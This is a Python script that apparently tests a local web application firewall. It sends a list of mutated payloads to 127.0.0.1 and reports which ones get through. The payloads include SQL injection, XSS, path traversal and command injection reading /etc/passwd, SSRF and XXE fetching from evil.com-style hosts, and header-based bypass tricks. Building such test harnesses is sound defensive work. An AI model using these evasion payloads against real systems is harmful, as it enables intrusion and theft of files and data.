import httpx, time, urllib.parse

GW = "http://127.0.0.1:8080"
BASE = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,*/*;q=0.8"}

def hit(method, path, body=None, ctype=None, extra=None):
    h = dict(BASE)
    if ctype:
        h["Content-Type"] = ctype
    if extra:
        h.update(extra)
    try:
        if method == "GET":
            r = httpx.get(GW + path, headers=h, timeout=10)
        else:
            r = httpx.post(GW + path, headers=h, content=body, timeout=10)
        code = r.status_code
    except Exception as e:
        return ("ERR", str(e)[:30], "", "")
    time.sleep(0.35)
    try:
        logs = httpx.get(GW + "/api/logs", params={"limit": 1}, timeout=5).json()["logs"]
    except Exception:
        return (code, "?", "", "")
    l = logs[0] if logs else {}
    labels = ",".join(x.get("label", "")[:18] for x in l.get("rules", []))[:60]
    return (code, l.get("score", "?"), l.get("action", "?"), labels)

CASES = [
 # --- SQL injection mutations ---
 ("SQLi", "GET", "/search?q=1'%20OR%201=1--", None, None, None),
 ("SQLi", "GET", "/search?q=1'%2f**%2fOR%2f**%2f1=1--", None, None, None),
 ("SQLi", "GET", "/search?q=1'%0aOR%0a1%3d1--", None, None, None),
 ("SQLi", "GET", "/search?q=1'%09OR%091%3d1", None, None, None),
 ("SQLi", "GET", "/search?q=1'%2520OR%25201%253d1", None, None, None),
 ("SQLi", "GET", "/search?q=%2527%2520OR%2520%25271%2527%253d%25271", None, None, None),
 ("SQLi", "GET", "/search?q=1'%0bOR%0b1%3d1", None, None, None),
 ("SQLi", "GET", "/search?q=1'%c0%a0OR%c0%a01%3d1", None, None, None),
 ("SQLi", "GET", "/search?q=UNIOn%0aSELect%0a1,2,3", None, None, None),
 ("SQLi", "GET", "/search?q=%2f*!50000*%2fUNION%2f*!50000*%2fSELECT%2f*!50000*%2f1", None, None, None),
 ("SQLi", "GET", "/search?q=1;SELECT%20*%20FROM%20users", None, None, None),
 ("SQLi", "POST", "/login", "user=admin'/**/OR/**/1=1--&pass=x", "application/x-www-form-urlencoded", None),
 ("SQLi", "POST", "/login", "user=1'%26%26SLEEP(5)--&pass=x", "application/x-www-form-urlencoded", None),
 ("SQLi", "GET", "/search?q=1'%20||%20'1'%3d'1", None, None, None),
 ("SQLi", "GET", "/search?q=%27%20or%20not%201%3d0--", None, None, None),
 ("SQLi", "GET", "/search?q=1%27%20between%200%20and%201--", None, None, None),
 ("SQLi", "GET", "/profile?id=1%20regexp%20%27%5ba-z%5d%27", None, None, None),

 # --- XSS mutations ---
 ("XSS", "GET", "/search?q=%3csvg%2fonload%3dalert(1)%3e", None, None, None),
 ("XSS", "GET", "/search?q=%3CIMG%20SRC=X%20ONERROR%3D%5Calert(1)%5C%3E", None, None, None),
 ("XSS", "GET", "/search?q=%3cscr%3cscript%3eipt%3ealert(1)%3c/script%3e", None, None, None),
 ("XSS", "GET", "/search?q=%253cscript%253ealert(1)%253c/script%253e", None, None, None),
 ("XSS", "GET", "/search?q=%3cbody%20onload%3dalert(1)%3e", None, None, None),
 ("XSS", "GET", "/search?q=%22%20onfocus%3dalert(document.domain)%20autofocus%3d%22", None, None, None),
 ("XSS", "GET", "/search?q=%3ciframe%20src%3djavascript:alert(1)%3e", None, None, None),
 ("XSS", "POST", "/login", "user=%3csvg%2fonload%3dalert(1)%3e&pass=x", "application/x-www-form-urlencoded", None),
 ("XSS", "GET", "/search?q=%26lt%3bscript%26gt%3balert(1)", None, None, None),
 ("XSS", "GET", "/search?q=\\u003cscript\\u003ealert(1)", None, None, None),

 # --- traversal ---
 ("TRAVERSAL", "GET", "/download?file=....//....//windows/win.ini", None, None, None),
 ("TRAVERSAL", "GET", "/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", None, None, None),
 ("TRAVERSAL", "GET", "/download?file=..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts", None, None, None),
 ("TRAVERSAL", "GET", "/download?file=%252e%252e%252fetc%252fpasswd", None, None, None),
 ("TRAVERSAL", "GET", "/download?file=/etc/passwd%00.jpg", None, None, None),
 ("TRAVERSAL", "GET", "/download?file=..%c0%af..%c0%afetc%c0%afpasswd", None, None, None),
 ("TRAVERSAL", "GET", "/download?file=%2e%2e\\%2e%2e\\boot.ini", None, None, None),

 # --- command injection ---
 ("CMDI", "GET", "/run?cmd=;cat%20/etc/passwd", None, None, None),
 ("CMDi", "GET", "/run?cmd=%0acat%20/etc/passwd", None, None, None),
 ("CMDi", "GET", "/run?cmd=%60id%60", None, None, None),
 ("CMDi", "GET", "/run?cmd=%7C%7Cwhoami", None, None, None),
 ("CMDi", "GET", "/run?cmd=%26%26dir", None, None, None),
 ("CMDi", "GET", "/run?cmd=cat%24%7bIFS%7d/etc/passwd", None, None, None),
 ("CMDi", "GET", "/run?cmd=%24(reverse$IFS%7c'sh')", None, None, None),
 ("CMDi", "GET", "/run?cmd=cmd.exe%2fQ%2fc%22type%20C:%5CWindows%5Cwin.ini%22", None, None, None),
 ("CMDi", "GET", "/run?cmd=|powershell%20-enc%20SQBFAFgA", None, None, None),

 # --- SSTI / template ---
 ("SSTI", "GET", "/profile?id=%24%7b7*7%7d", None, None, None),
 ("SSTI", "GET", "/profile?id=%3c%25%3d%207*7%20%25%3e", None, None, None),
 ("SSTI", "GET", "/profile?id=%23%7b7*7%7d", None, None, None),
 ("SSTI", "GET", "/profile?id=%7B%7Bconfig.__class__%7D%7D", None, None, None),
 ("SSTI", "GET", "/profile?id=%25%7B%7B7*7%7D%7B", None, None, None),

 # --- SSRF / redirect ---
 ("SSRF", "GET", "/search?redirect=http:%2f%2f127.0.0.1:6379", None, None, None),
 ("SSRF", "GET", "/search?redirect=http://0x7f000001", None, None, None),
 ("SSRF", "GET", "/search?redirect=http://[::1]/", None, None, None),
 ("SSRF", "GET", "/search?redirect=http://2130706433", None, None, None),
 ("SSRF", "GET", "/search?redirect=http://localtest.me/", None, None, None),
 ("SSRF", "GET", "/search?redirect=http%3A%2F%2F127.0.0.1%252f@evil.com/", None, None, None),

 # --- XXE / deserial / misc ---
 ("XXE", "POST", "/login", "<?xml version='1.0'?><!DOCTYPE r [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><r>&xxe;</r>", "text/xml", None),
 ("XXE", "POST", "/login", "<!DOCTYPE r [<!ENTITY % dtd SYSTEM 'http://evil.io/x.dtd'>%dtd;]><r/>", "application/xml", None),
 ("DESER", "POST", "/login", '{"__proto__":{"isAdmin":true}}', "application/json", None),
 ("LDAP", "GET", "/search?q=*)(uid%3D*", None, None, None),

 # --- CRLF / header injection ---
 ("CRLF", "GET", "/search?q=x%0d%0aX-Injected:%20yes", None, None, None),
 ("CRLF", "GET", "/search?q=x%0aSet-Cookie:%20a=1", None, None, None),

 # --- request-shape changes (Burp repeater style) ---
 ("SHAPE", "POST", "/search?q=1'%20OR%201=1--", None, "application/json", None),
 ("SHAPE", "GET", "/search?q=1'%20OR%201=1--", None, None, {"X-Original-URL": "/admin"}),
 ("SHAPE", "GET", "/search?q=1'%20OR%201=1--", None, None, {"X-Forwarded-For": "127.0.0.1"}),
 ("SHAPE", "GET", "/search?q=1'%20OR%201=1--", None, None, {"Accept": "application/json", "User-Agent": "curl/8.0"}),
 ("SHAPE", "GET", "/search?q=1'%20OR%201=1--", None, None, {"User-Agent": ""}),
 ("SHAPE", "POST", "/api/items", "q=1'%20OR%201=1--", "text/plain", None),
 ("SHAPE", "GET", "/search?q=1'%20OR%201=1--", None, None, {"Referer": "http://127.0.0.1:8080/search"}),

 # --- decoys / secrets ---
 ("DECOY", "GET", "/.git/config", None, None, None),
 ("DECOY", "GET", "/backup.sql", None, None, None),
 ("DECOY", "GET", "/server-status", None, None, None),
 ("DECOY", "GET", "/%2e%2e/.env", None, None, None),
]

print("%-9s %-6s %-46s %-5s %-6s %-10s %s" % ("CLASS", "METH", "PATH", "CODE", "SCORE", "ACTION", "RULES"))
print("-" * 130)
leaks = []
for cls, m, p, b, ct, extra in CASES:
    code, score, action, labels = hit(m, p, b, ct, extra)
    flag = ""
    if action == "ALLOW" or code == 200:
        flag = "  <== LEAK"
        leaks.append((cls, p, code, score, action, labels))
    elif action == "CHALLENGE":
        flag = "  (challenge)"
    print("%-9s %-6s %-46s %-5s %-6s %-10s %s%s" % (cls, m, p[:46], code, score, action, labels, flag))

print("\n==== SUMMARY ====")
from collections import Counter
print("total cases:", len(CASES))
print("leaks (ALLOW/200):", len(leaks))
for l in leaks:
    print("   LEAK:", l)

try:
    httpx.post(GW + "/api/unblock", json={"ip": "127.0.0.1"}, timeout=5)
    print("[cleanup] unblocked 127.0.0.1 (decoy section bans the caller by design)")
except Exception as e:
    print("[cleanup] unblock failed:", e)
